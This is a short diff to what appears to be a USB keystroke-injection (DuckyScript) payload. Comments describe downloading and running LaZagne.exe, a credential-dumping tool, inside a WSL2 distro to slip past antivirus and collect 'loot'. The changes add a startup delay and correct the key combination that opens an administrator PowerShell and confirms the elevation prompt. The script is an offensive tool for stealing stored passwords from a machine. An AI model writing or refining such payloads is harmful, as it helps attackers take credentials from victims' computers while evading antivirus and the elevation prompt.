@@ -10,6 +10,9 @@ REM While the antivirus cannot detect the downloaded file, it may be detected du
 REM In my testing, LaZagne.exe can be downloaded and executed, you will get the loot, the antivirus will detect the execution and kill the process at some point, but you will get all loot and the file will remain in the WSL2 distro                       
 
 
+REM initial enumeration delay
+DELAY 2000
+
 REM change to your target language
 DUCKY_LANG us
 
@@ -20,7 +23,7 @@ DELAY 100
 
 REM Open the Powershell as Administrator
 STRING powershell
-CTRL-SHIFT ENTER
+CTRL SHIFT ENTER
 DELAY 300
 ALT y
 
